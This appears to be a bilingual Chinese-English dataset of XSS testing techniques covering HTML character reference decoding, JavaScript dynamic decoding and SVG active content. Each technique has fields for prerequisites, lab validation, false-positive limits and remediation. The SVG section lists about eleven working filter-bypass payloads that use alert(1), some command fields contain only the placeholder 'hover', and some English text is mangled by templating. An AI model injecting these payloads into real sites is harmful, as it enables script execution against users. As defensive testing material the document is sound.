vulnerability.en: 该问题的输入与输出前提为：模板允许用户值闭合现有属性或插入新元素，同时缺少属性值编码、元素白名单与 HTML 消毒。审查时必须确认“浏览器是否把注入片段解析为 onerror、onload、onfocus 等事件属性并在对应生命周期触发”，并把服务端响应、最终 DOM、事件条件和浏览器版本关联起来。若无法满足“指定元素事件触发时记录的唯一标记，并同时保存最终 DOM 与事件类型”这一证据要求，只能说明输入进入页面，不能确认 XSS。

exploitation.zh: 分别选择自动触发与需要焦点、悬停或展开的样例，在相同页面状态下逐一重放，记录哪些元素与事件仍被消毒器允许。为每行样例分配独立的无害标记，每轮只改变一种标签、属性或编码形式；同时保存原始响应、最终 DOM、控制台和事件记录，以排除缓存、浏览器容错及人工交互造成的假阳性。
exploitation.en: In an authorized isolated environment, replay automatic and interaction-dependent samples separately under the same page state, recording which elements and events survive sanitization. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 使用维护中的 HTML 消毒器移除事件属性和危险元素，对必须保留的属性执行上下文编码，并避免通过字符串拼接创建 DOM。修复后在同一输出位置重放普通文本、边界字符和最小异常样例，确认合法内容继续显示，同时活动节点、危险属性和对应执行记录均不再出现。
mitigation.en: Remediation should use a maintained HTML sanitizer to remove event attributes and dangerous elements, encode any retained attributes for their context, and avoid string-based DOM construction. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

name.zh: HTML 字符引用解码差异

description.zh: 验证十进制与十六进制字符引用在属性值和脚本相关上下文中的解码顺序，识别过滤前后规范化不一致导致的 XSS。
description.en: Tests decimal and hexadecimal character-reference decoding order in attribute and script-adjacent contexts to identify XSS caused by normalization mismatches.

prerequisites.zh: 能够记录字符引用在代理、应用模板、HTML tokenizer 和 DOM 属性值中的每一次解码结果与顺序。
prerequisites.en: Every character-reference decoding result and order across proxy, application template, HTML tokenizer, and DOM attribute value can be recorded.

prerequisites.zh: 同一上下文准备未编码、十进制引用、十六进制引用和双重编码的固定 marker 对照，并关闭无关浏览器扩展。
prerequisites.en: The same context has plain, decimal-reference, hexadecimal-reference, and double-encoded fixed-marker controls, with unrelated browser extensions disabled.

title.zh: HTML实体编码绕过
title.en: Validation step 1 for HTML Character Reference Decoding Differences

execution.command:
hover
hover

description.zh: HTML实体编码绕过包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this HTML Character Reference Decoding Differences validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是过滤器检查的值与浏览器最终解码值不同，解码后恢复可执行事件或脚本语法并由注入节点执行 marker。 假阳性边界：字符引用被解码成普通文本、仅在查看源码时呈现危险字符、DOM 中保持转义，或响应差异没有任何执行事件，均不是 XSS。
analysis.en: Positive evidence requires a difference between the filter-inspected value and the browser's final decoded value that restores executable event or script syntax and runs the marker from the injected node. False-positive boundary: References decoded to plain text, dangerous characters visible only in source view, still-escaped DOM output, or response differences without an execution event are not XSS.

opsecTips.zh: HTML 字符引用测试每轮只改变一种编码层；发现二次解码扩散到日志、邮件或其他非测试渲染器时立即停止。
opsecTips.en: HTML Character Reference testing changes one encoding layer per run; stop if secondary decoding propagates into logs, email, or another non-test renderer.

opsecTips.zh: 清除含编码样例的数据库记录、模板缓存和代理缓存，关闭解码跟踪，并用普通实体输入回归确认渲染恢复。
opsecTips.en: Remove encoded samples from storage plus template and proxy caches, disable decoding traces, and regress with ordinary entities to confirm normal rendering.

title.zh: 定位“HTML 字符引用解码差异”的输出上下文
title.en: Scope the HTML Character Reference Decoding Differences data flow

description.zh: 沿真实业务入口追踪到最终 HTML 位置，核对前提“过滤逻辑在编码形态上匹配危险字符，而后续 HTML 解析器把实体还原为括号、引号或可执行属性内容”，并记录模板、消毒器和浏览器版本。
description.en: Trace the real input to the final sink or policy decision, confirm that filtering matches the encoded representation while a later HTML parser restores parentheses, quotes, or executable attribute content, and record browser, response-header, and relevant component versions.

title.zh: 建立“HTML 解码与规范化”解析基线
title.en: Establish the HTML Decoding and Normalization baseline

description.zh: 先提交普通文本与边界字符，保存响应和最终 DOM；有效执行必须满足证据要求“解析后的 DOM 属性值与唯一执行标记同时出现，并能用普通编码对照排除模板二次转义”。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the decoded DOM attribute value and unique execution marker appear together, with a normal-encoding control excluding template double escaping as valid evidence.

title.zh: 逐条重放“HTML 字符引用解码差异”样例
title.en: Run a single-variable HTML Character Reference Decoding Differences check

description.zh: 对同一危险字符依次提交原字符、十进制实体和十六进制实体，比较服务端响应、DOM 属性值与执行结果，确认差异发生在哪一层；每次只替换一行并缩减命中项，所有外部地址均改为隔离测试端点。
description.en: submit the literal character, decimal reference, and hexadecimal reference through the same sink, comparing the response, DOM attribute value, and execution result to locate the differing layer; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload:
hover
hover

title.zh: 修复并回归“HTML 字符引用解码差异”
title.en: Retest the HTML Character Reference Decoding Differences remediation boundary

description.zh: 先按统一字符集解码和规范化输入，再依据最终输出上下文编码；不要依赖黑名单匹配编码片段，并避免重复解码不可信数据；随后重放正常内容和最小异常样例，确认业务显示正常且活动内容不再生成。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the decoded DOM attribute value and unique execution marker appear together, with a normal-encoding control excluding template double escaping no longer appears.

overview.zh: HTML 字符引用解码差异用于核对 HTML 解析器如何处理当前输出位置。具体审查目标为：安全过滤器与浏览器对 HTML 字符引用的解码次数、位置和结果是否一致。测试成立的前提为：过滤逻辑在编码形态上匹配危险字符，而后续 HTML 解析器把实体还原为括号、引号或可执行属性内容。证据要求为：解析后的 DOM 属性值与唯一执行标记同时出现，并能用普通编码对照排除模板二次转义。响应中出现输入文本或标签并不等同于脚本已经执行。
overview.en: HTML Character Reference Decoding Differences checks whether the security filter and browser agree on when, where, and how many times HTML character references are decoded. It applies when filtering matches the encoded representation while a later HTML parser restores parentheses, quotes, or executable attribute content. A conclusion requires the decoded DOM attribute value and unique execution marker appear together, with a normal-encoding control excluding template double escaping; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 该问题的输入与输出前提为：过滤逻辑在编码形态上匹配危险字符，而后续 HTML 解析器把实体还原为括号、引号或可执行属性内容。审查时必须确认“安全过滤器与浏览器对 HTML 字符引用的解码次数、位置和结果是否一致”，并把服务端响应、最终 DOM、事件条件和浏览器版本关联起来。若无法满足“解析后的 DOM 属性值与唯一执行标记同时出现，并能用普通编码对照排除模板二次转义”这一证据要求，只能说明输入进入页面，不能确认 XSS。
vulnerability.en: The risk exists when filtering matches the encoded representation while a later HTML parser restores parentheses, quotes, or executable attribute content, allowing whether the security filter and browser agree on when, where, and how many times HTML character references are decoded. Review the input source, final parsing context, browser or policy version, and the decoded DOM attribute value and unique execution marker appear together, with a normal-encoding control excluding template double escaping; otherwise record only an unconfirmed control differential.

exploitation.zh: 对同一危险字符依次提交原字符、十进制实体和十六进制实体，比较服务端响应、DOM 属性值与执行结果，确认差异发生在哪一层。为每行样例分配独立的无害标记，每轮只改变一种标签、属性或编码形式；同时保存原始响应、最终 DOM、控制台和事件记录，以排除缓存、浏览器容错及人工交互造成的假阳性。
exploitation.en: In an authorized isolated environment, submit the literal character, decimal reference, and hexadecimal reference through the same sink, comparing the response, DOM attribute value, and execution result to locate the differing layer. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 先按统一字符集解码和规范化输入，再依据最终输出上下文编码；不要依赖黑名单匹配编码片段，并避免重复解码不可信数据。修复后在同一输出位置重放普通文本、边界字符和最小异常样例，确认合法内容继续显示，同时活动节点、危险属性和对应执行记录均不再出现。
mitigation.en: Remediation should decode and canonicalize with one character set before validation, then encode for the final output context; avoid encoded-string blacklists and repeated decoding of untrusted data. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

name.zh: JavaScript 转义与动态解码注入
name.en: Java Script Escape and Dynamic Decoding Injection

description.zh: 覆盖十六进制、八进制、Base64、属性拼接等 JavaScript 表达方式，验证过滤器与脚本引擎之间的规范化差异。
description.en: Covers hexadecimal, octal, Base64, and property-concatenation forms to test normalization differences between filtering logic and the Java Script engine.

prerequisites.zh: 可控字符串处于 JavaScript 源码或会被 eval、Function、atob 等动态解码器处理的路径，而非普通 HTML 文本。
prerequisites.en: The controllable string is in Java Script source or a path processed by eval, Function, atob, or another dynamic decoder rather than ordinary HTML text.

prerequisites.zh: 已对动态求值和解码 API 加入只读调用跟踪，使用仅设置固定内存标志的 marker，并记录解码前后字符串。
prerequisites.en: Dynamic evaluation and decoding APIs have read-only call tracing, the marker only sets a fixed in-memory flag, and pre- and post-decoding strings are recorded.

title.zh: Unicode/Hex/八进制编码
title.en: Validation step 1 for Java Script Escape and Dynamic Decoding Injection

description.zh: Unicode/Hex/八进制编码包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Java Script Escape and Dynamic Decoding Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是目标脚本引擎将转义或 Base64 输入还原为可执行表达式，随后由真实动态 sink 编译并执行 marker，调用栈可回溯到可控来源。 假阳性边界：成功解码但结果只被显示、语法错误、CSP unsafe-eval 阻断、测试人员在控制台手工 eval，或关键字匹配均不能证明注入。
analysis.en: Positive evidence requires the target engine to reconstruct an executable expression from escaped or Base64 input and a real dynamic sink to compile and run the marker, with the call stack traced to the controllable source. False-positive boundary: Successful decoding followed only by display, a syntax error, CSP unsafe-eval blocking, manual console eval, or keyword matching does not prove injection.

opsecTips.zh: JavaScript 转义测试禁止编码系统命令、网络地址或敏感对象引用；出现动态外连、定时器风暴或全局状态污染时停止。
opsecTips.en: Java Script escape testing must not encode system commands, network destinations, or sensitive object references; stop on dynamic egress, timer storms, or global-state pollution.

opsecTips.zh: 撤销 API instrumentation，删除测试脚本和本地存储标记，取消遗留定时器并重载隔离页面确认全局对象已恢复。
opsecTips.en: Remove API instrumentation, test scripts, and local-storage markers, cancel residual timers, and reload the isolated page to confirm globals are restored.

title.zh: 定位“JavaScript 转义与动态解码注入”的输出上下文
title.en: Scope the Java Script Escape and Dynamic Decoding Injection data flow

description.zh: 沿真实业务入口追踪到最终 HTML 位置，核对前提“不可信数据已经进入可执行 JavaScript 上下文，而防护只匹配 alert、script 等表面词法形式，没有阻止动态求值”，并记录模板、消毒器和浏览器版本。
description.en: Trace the real input to the final sink or policy decision, confirm that untrusted data already reaches executable Java Script while defenses only match surface tokens such as alert or script and still permit dynamic evaluation, and record browser, response-header, and relevant component versions.

title.zh: 建立“JavaScript 解码上下文”解析基线
title.en: Establish the Java Script Decoding Context baseline

description.zh: 先提交普通文本与边界字符，保存响应和最终 DOM；有效执行必须满足证据要求“浏览器控制台或测试钩子记录到解码后的函数调用，且相同字符串放入纯文本节点时不会执行”。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only a browser console or test hook records the decoded function call while the same string remains inert in a plain text node as valid evidence.

title.zh: 逐条重放“JavaScript 转义与动态解码注入”样例
title.en: Run a single-variable Java Script Escape and Dynamic Decoding Injection check

description.zh: 在已确认的 JavaScript sink 中逐一重放转义、拼接与 atob 变体，比较源代码文本、运行时值和 CSP 违规日志，不跨上下文套用结论；每次只替换一行并缩减命中项，所有外部地址均改为隔离测试端点。
description.en: replay escape, concatenation, and atob variants only in a confirmed Java Script sink, comparing source text, runtime values, and CSP violation logs without extrapolating across contexts; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

title.zh: 修复并回归“JavaScript 转义与动态解码注入”
title.en: Retest the Java Script Escape and Dynamic Decoding Injection remediation boundary

description.zh: 禁止把用户输入插入脚本源代码，使用 JSON 序列化传递数据并通过固定函数处理；移除 eval、Function 和字符串形式的定时器；随后重放正常内容和最小异常样例，确认业务显示正常且活动内容不再生成。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while a browser console or test hook records the decoded function call while the same string remains inert in a plain text node no longer appears.

overview.zh: JavaScript 转义与动态解码注入用于核对 HTML 解析器如何处理当前输出位置。具体审查目标为：脚本引擎是否在运行时把转义序列、字符串拼接或 Base64 内容恢复为原本被过滤的可调用标识符。测试成立的前提为：不可信数据已经进入可执行 JavaScript 上下文，而防护只匹配 alert、script 等表面词法形式，没有阻止动态求值。证据要求为：浏览器控制台或测试钩子记录到解码后的函数调用，且相同字符串放入纯文本节点时不会执行。响应中出现输入文本或标签并不等同于脚本已经执行。
overview.en: Java Script Escape and Dynamic Decoding Injection checks whether the Java Script engine reconstructs a filtered callable identifier at runtime from escape sequences, string concatenation, or Base64 content. It applies when untrusted data already reaches executable Java Script while defenses only match surface tokens such as alert or script and still permit dynamic evaluation. A conclusion requires a browser console or test hook records the decoded function call while the same string remains inert in a plain text node; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 该问题的输入与输出前提为：不可信数据已经进入可执行 JavaScript 上下文，而防护只匹配 alert、script 等表面词法形式，没有阻止动态求值。审查时必须确认“脚本引擎是否在运行时把转义序列、字符串拼接或 Base64 内容恢复为原本被过滤的可调用标识符”，并把服务端响应、最终 DOM、事件条件和浏览器版本关联起来。若无法满足“浏览器控制台或测试钩子记录到解码后的函数调用，且相同字符串放入纯文本节点时不会执行”这一证据要求，只能说明输入进入页面，不能确认 XSS。
vulnerability.en: The risk exists when untrusted data already reaches executable Java Script while defenses only match surface tokens such as alert or script and still permit dynamic evaluation, allowing whether the Java Script engine reconstructs a filtered callable identifier at runtime from escape sequences, string concatenation, or Base64 content. Review the input source, final parsing context, browser or policy version, and a browser console or test hook records the decoded function call while the same string remains inert in a plain text node; otherwise record only an unconfirmed control differential.

exploitation.zh: 在已确认的 JavaScript sink 中逐一重放转义、拼接与 atob 变体，比较源代码文本、运行时值和 CSP 违规日志，不跨上下文套用结论。为每行样例分配独立的无害标记，每轮只改变一种标签、属性或编码形式；同时保存原始响应、最终 DOM、控制台和事件记录，以排除缓存、浏览器容错及人工交互造成的假阳性。
exploitation.en: In an authorized isolated environment, replay escape, concatenation, and atob variants only in a confirmed Java Script sink, comparing source text, runtime values, and CSP violation logs without extrapolating across contexts. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 禁止把用户输入插入脚本源代码，使用 JSON 序列化传递数据并通过固定函数处理；移除 eval、Function 和字符串形式的定时器。修复后在同一输出位置重放普通文本、边界字符和最小异常样例，确认合法内容继续显示，同时活动节点、危险属性和对应执行记录均不再出现。
mitigation.en: Remediation should do not interpolate user input into script source; pass data through JSON serialization and fixed functions, and remove eval, Function, and string-based timers. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

name.zh: SVG 活动内容注入

description.zh: 验证 SVG 命名空间中的 script、动画事件、foreignObject 与外部引用是否被当作活动内容执行，而非普通图片数据。
description.en: Tests whether script, animation events, foreign Object, and external references in the SVG namespace execute as active content rather than inert image data.

prerequisites.zh: 已确认 SVG 是内联进入 HTML/SVG 命名空间或以可执行文档方式加载，而不是只经过 img 解码器或附件下载。
prerequisites.en: The SVG is confirmed to enter the inline HTML or SVG namespace or load as an active document rather than pass only through an image decoder or attachment download.

prerequisites.zh: 目标浏览器版本、CSP、SVG sanitizer 和加载方式均已记录，所有事件与外部引用替换为本地固定 marker。
prerequisites.en: The target browser version, CSP, SVG sanitizer, and loading mode are recorded, with every event and external reference replaced by a local fixed marker.

title.zh: SVG矢量绕过
title.en: Validation step 1 for SVG Active Content Injection

execution.command:
<svg><script>alert(1)</script></svg>
<svg><script>alert(1)</script></svg>
<svg><a><rect width=99% height=99% /><animate attributeName=href values=javascript:alert(1)></svg>
<svg><set attributeName=onload value=alert(1)></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><animate onend=alert(1) attributeName=x dur=1s>
<svg><foreignObject><body xmlns=http://www.w3.org/1999/xhtml><script>alert(1)</script></body></foreignObject></svg>
<svg><use href=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+></use></svg>
<svg><circle><set onbegin=alert(1) attributename=fill to=red></circle></svg>
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><style><img/src=x onerror=alert(1)></style></svg>

description.zh: SVG矢量绕过包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this SVG Active Content Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是 SVG 命名空间中的 script、动画事件或 foreignObject 处理路径实际执行 marker，并由对应 SVG 节点和浏览器调用栈证明。 假阳性边界：SVG 文件上传成功、作为 img 正常显示、源码含 script、外部资源被 CSP 阻止或 sanitizer 已移除活动节点都不构成执行。
analysis.en: Positive evidence requires a script, animation event, or foreign Object path in the SVG namespace to execute the marker, proven by the responsible SVG node and browser call stack. False-positive boundary: Successful SVG upload, normal display through img, script text in source, a CSP-blocked external resource, or sanitizer removal of active nodes does not establish execution.

opsecTips.zh: SVG 活动内容验证不得加载公共外部资源或访问父页面数据；出现跨源导航、重复动画触发或对象 URL 泄漏时停止。
opsecTips.en: SVG Active Content validation must not load public resources or access parent-page data; stop on cross-origin navigation, repeated animation triggers, or object-URL leakage.

opsecTips.zh: 删除上传和内联 SVG、撤销 object/blob URL、清理图片/CDN 缓存及 CSP 报告，并重载宿主页确认无活动节点。
opsecTips.en: Delete uploaded and inline SVGs, revoke object and blob URLs, clear image and CDN caches plus CSP reports, and reload the host page to confirm no active node remains.

title.zh: 定位“SVG 活动内容注入”的输出上下文
title.en: Scope the SVG Active Content Injection data flow

description.zh: 沿真实业务入口追踪到最终 HTML 位置，核对前提“系统仅按文件扩展名或 image/svg+xml 接受内容，却在同源文档中内联渲染或允许 foreignObject、script 与动画事件”，并记录模板、消毒器和浏览器版本。
description.en: Trace the real input to the final sink or policy decision, confirm that the system trusts an extension or image/svg+xml type but renders the file inline on the application origin or permits foreign Object, script, and animation events, and record browser, response-header, and relevant component versions.

title.zh: 建立“SVG 命名空间”解析基线

description.zh: 先提交普通文本与边界字符，保存响应和最终 DOM；有效执行必须满足证据要求“SVG 进入最终 DOM 后的命名空间、被保留的活动节点以及唯一执行标记三者可以关联”。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the final SVG namespace, surviving active node, and unique execution marker can be correlated after insertion into the DOM as valid evidence.

title.zh: 逐条重放“SVG 活动内容注入”样例
title.en: Run a single-variable SVG Active Content Injection check

description.zh: 分别以 img 引用、独立文件打开和内联 SVG 三种方式加载同一安全标记样例，确认只有真实产品渲染路径中的执行才算成立；每次只替换一行并缩减命中项，所有外部地址均改为隔离测试端点。
